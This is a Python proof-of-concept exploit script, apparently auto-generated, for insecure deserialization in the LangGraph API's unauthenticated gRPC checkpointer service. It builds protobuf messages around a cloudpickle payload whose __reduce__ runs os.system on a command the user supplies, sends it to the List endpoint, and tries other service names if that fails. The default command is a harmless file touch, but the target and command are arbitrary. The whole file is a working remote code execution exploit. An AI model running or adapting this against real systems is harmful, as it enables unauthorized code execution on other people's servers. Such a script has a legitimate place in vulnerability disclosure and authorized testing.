#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-003
# Sink: serialized_value_from_proto
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities_serialized_value_from_proto_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LangGraph gRPC insecure deserialization (RCE).
Target: langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)

Vulnerability: The gRPC services are exposed without authentication. The
serialized_value_from_proto function uses cloudpickle/msgpack to deserialize
attacker-controlled data from protobuf messages, allowing arbitrary code execution.

This PoC sends a crafted protobuf message to the gRPC endpoint that triggers
deserialization of a malicious pickle payload, executing a benign command.

Usage:
    python3 poc_langgraph_rce.py [--target TARGET] [--port PORT]

Default: localhost:50051
"""

import argparse
import struct
import sys
import os
import subprocess
import time

# Try to import grpc and protobuf; fail gracefully if missing
try:
    import grpc
    from grpc import aio
except ImportError:
    print("[!] grpc module not installed. Install with: pip install grpcio")
    sys.exit(1)

try:
    from google.protobuf import descriptor_pb2, descriptor_pool, message_factory, symbol_database
except ImportError:
    print("[!] protobuf module not installed. Install with: pip install protobuf")
    sys.exit(1)

# We need cloudpickle to craft the malicious payload
try:
    import cloudpickle
except ImportError:
    print("[!] cloudpickle module not installed. Install with: pip install cloudpickle")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Step 1: Define the protobuf message types we need (minimal definitions)
# ---------------------------------------------------------------------------
# We need to construct a SerializedValue message with encoding="pickle" and
# a malicious value. We'll use the dynamic protobuf factory.

def build_proto_descriptors():
    """Build minimal protobuf descriptors for the messages we need."""
    # Create a file descriptor proto
    file_desc = descriptor_pb2.FileDescriptorProto()
    file_desc.name = "langgraph_checkpoint.proto"
    file_desc.package = "langgraph"
    file_desc.syntax = "proto3"

    # SerializedValue message
    msg_serialized = file_desc.message_type.add()
    msg_serialized.name = "SerializedValue"
    field_encoding = msg_serialized.field.add()
    field_encoding.name = "encoding"
    field_encoding.number = 1
    field_encoding.type = descriptor_pb2.FieldDescriptorProto.TYPE_STRING
    field_encoding.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    field_value = msg_serialized.field.add()
    field_value.name = "value"
    field_value.number = 2
    field_value.type = descriptor_pb2.FieldDescriptorProto.TYPE_BYTES
    field_value.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    # ChannelValue message (wrapper)
    msg_channel = file_desc.message_type.add()
    msg_channel.name = "ChannelValue"
    field_serialized = msg_channel.field.add()
    field_serialized.name = "serialized_value"
    field_serialized.number = 1
    field_serialized.type = descriptor_pb2.FieldDescriptorProto.TYPE_MESSAGE
    field_serialized.type_name = ".langgraph.SerializedValue"
    field_serialized.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL
    field_serialized.oneof_index = 0

    # Add oneof for val
    oneof = msg_channel.oneof_decl.add()
    oneof.name = "val"

    # PendingWrite message
    msg_pw = file_desc.message_type.add()
    msg_pw.name = "PendingWrite"
    field_task_id = msg_pw.field.add()
    field_task_id.name = "task_id"
    field_task_id.number = 1
    field_task_id.type = descriptor_pb2.FieldDescriptorProto.TYPE_STRING
    field_task_id.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    field_channel = msg_pw.field.add()
    field_channel.name = "channel"
    field_channel.number = 2
    field_channel.type = descriptor_pb2.FieldDescriptorProto.TYPE_STRING
    field_channel.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    field_value_pw = msg_pw.field.add()
    field_value_pw.name = "value"
    field_value_pw.number = 3
    field_value_pw.type = descriptor_pb2.FieldDescriptorProto.TYPE_MESSAGE
    field_value_pw.type_name = ".langgraph.ChannelValue"
    field_value_pw.label = descriptor_pb2.FieldDescriptorProto.LABEL_OPTIONAL

    # CheckpointTuple message (simplified)
    msg_tuple = file_desc.message_type.add()
    msg_tuple.name = "CheckpointTuple"
    field_pending = msg_tuple.field.add()
    field_pending.name = "pending_writes"
    field_pending.number = 5
    field_pending.type = descriptor_pb2.FieldDescriptorProto.TYPE_MESSAGE
    field_pending.type_name = ".langgraph.PendingWrite"
    field_pending.label = descriptor_pb2.FieldDescriptorProto.LABEL_REPEATED

    # ListResponse message
    msg_list_resp = file_desc.message_type.add()
    msg_list_resp.name = "ListResponse"
    field_tuples = msg_list_resp.field.add()
    field_tuples.name = "checkpoint_tuples"
    field_tuples.number = 1
    field_tuples.type = descriptor_pb2.FieldDescriptorProto.TYPE_MESSAGE
    field_tuples.type_name = ".langgraph.CheckpointTuple"
    field_tuples.label = descriptor_pb2.FieldDescriptorProto.LABEL_REPEATED

    # Build the pool and factory
    pool = descriptor_pool.DescriptorPool()
    pool.Add(file_desc)
    factory = message_factory.MessageFactory(pool)

    # Get message classes
    SerializedValue = factory.GetPrototype(pool.FindMessageTypeByName("langgraph.SerializedValue"))
    ChannelValue = factory.GetPrototype(pool.FindMessageTypeByName("langgraph.ChannelValue"))
    PendingWrite = factory.GetPrototype(pool.FindMessageTypeByName("langgraph.PendingWrite"))
    CheckpointTuple = factory.GetPrototype(pool.FindMessageTypeByName("langgraph.CheckpointTuple"))
    ListResponse = factory.GetPrototype(pool.FindMessageTypeByName("langgraph.ListResponse"))

    return SerializedValue, ChannelValue, PendingWrite, CheckpointTuple, ListResponse


# ---------------------------------------------------------------------------
# Step 2: Craft the malicious pickle payload
# ---------------------------------------------------------------------------
def create_malicious_payload(command: str) -> bytes:
    """
    Create a cloudpickle payload that executes the given command.
    Uses a simple __reduce__ based payload for maximum compatibility.
    """
    class Exploit:
        def __reduce__(self):
            return (os.system, (command,))

    return cloudpickle.dumps(Exploit())


# ---------------------------------------------------------------------------
# Step 3: Build the gRPC request
# ---------------------------------------------------------------------------
def build_list_request(serialized_value_cls, channel_value_cls, pending_write_cls,
                       checkpoint_tuple_cls, list_response_cls, payload: bytes):
    """
    Build a ListRequest protobuf message that contains our malicious payload
    in the pending_writes of a checkpoint tuple.
    """
    # Create SerializedValue with encoding="pickle" and malicious bytes
    sv = serialized_value_cls()
    sv.encoding = "pickle"
    sv.value = payload

    # Wrap in ChannelValue
    cv = channel_value_cls()
    cv.serialized_value.CopyFrom(sv)

    # Create PendingWrite
    pw = pending_write_cls()
    pw.task_id = "exploit"
    pw.channel = "exploit"
    pw.value.CopyFrom(cv)

    # Create CheckpointTuple with the pending write
    ct = checkpoint_tuple_cls()
    ct.pending_writes.append(pw)

    # Create ListResponse with the tuple
    lr = list_response_cls()
    lr.checkpoint_tuples.append(ct)

    return lr


# ---------------------------------------------------------------------------
# Step 4: Send the gRPC request
# ---------------------------------------------------------------------------
async def send_grpc_exploit(target: str, port: int, command: str):
    """
    Connect to the gRPC server and send a List request with malicious payload.
    The server will deserialize our payload when processing the response.
    """
    # Build protobuf classes
    SerializedValue, ChannelValue, PendingWrite, CheckpointTuple, ListResponse = \
        build_proto_descriptors()

    # Create malicious payload
    print(f"[*] Creating malicious payload for command: {command}")
    payload = create_malicious_payload(command)
    print(f"[*] Payload size: {len(payload)} bytes")

    # Build the request message
    request = build_list_request(
        SerializedValue, ChannelValue, PendingWrite, CheckpointTuple, ListResponse,
        payload
    )

    # Serialize the request
    request_bytes = request.SerializeToString()
    print(f"[*] Request size: {len(request_bytes)} bytes")

    # Connect to gRPC server
    address = f"{target}:{port}"
    print(f"[*] Connecting to {address}...")

    try:
        async with aio.insecure_channel(address) as channel:
            # Create a generic stub - we'll send raw bytes
            # The service is CheckpointerService/List
            # We need to construct the gRPC call manually
            print("[*] Sending malicious List request...")

            # Create a unary-unary call
            call = channel.unary_unary(
                "/langgraph.CheckpointerService/List",
                request_serializer=lambda x: x,
                response_deserializer=lambda x: x,
            )

            # Send the request
            response_bytes = await call(request_bytes)

            print(f"[*] Response received ({len(response_bytes)} bytes)")

            # Try to parse response (may fail if exploit executed)
            try:
                response = ListResponse()
                response.ParseFromString(response_bytes)
                print(f"[*] Response parsed successfully (tuples: {len(response.checkpoint_tuples)})")
            except Exception as e:
                print(f"[!] Could not parse response: {e}")

            print("[*] Exploit sent successfully!")

    except grpc.RpcError as e:
        print(f"[!] gRPC error: {e.code()} - {e.details()}")
        if "unimplemented" in str(e.details()).lower():
            print("[!] Service not found. Trying alternative service names...")
            # Try alternative service names
            for service_name in ["Checkpointer", "CheckpointerService", "CheckpointService"]:
                try:
                    print(f"[*] Trying {service_name}...")
                    call = channel.unary_unary(
                        f"/langgraph.{service_name}/List",
                        request_serializer=lambda x: x,
                        response_deserializer=lambda x: x,
                    )
                    response_bytes = await call(request_bytes)
                    print(f"[*] Success with {service_name}!")
                    break
                except grpc.RpcError:
                    continue
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return False

    return True


# ---------------------------------------------------------------------------
# Step 5: Main function
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="LangGraph gRPC RCE PoC")
    parser.add_argument("--target", default="localhost", help="Target hostname/IP")
    parser.add_argument("--port", type=int, default=50051, help="gRPC port")
    parser.add_argument("--command", default="touch /tmp/poc_success.txt",
                        help="Command to execute (default: touch /tmp/poc_success.txt)")
    args = parser.parse_args()

    print("=" * 60)
    print("LangGraph gRPC Insecure Deserialization RCE PoC")
    print("=" * 60)
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Command: {args.command}")
    print()

    # Run the async exploit
    import asyncio
    success = asyncio.run(send_grpc_exploit(args.target, args.port, args.command))

    if success:
        print("\n[*] Exploit completed. Check if command was executed:")
        print(f"    Command: {args.command}")
        if "touch" in args.command:
            print(f"    Check: ls -la /tmp/poc_success.txt")
    else:
        print("\n[!] Exploit failed. The target may not be vulnerable or")
        print("    the service may be at a different endpoint.")


if __name__ == "__main__":
    main()
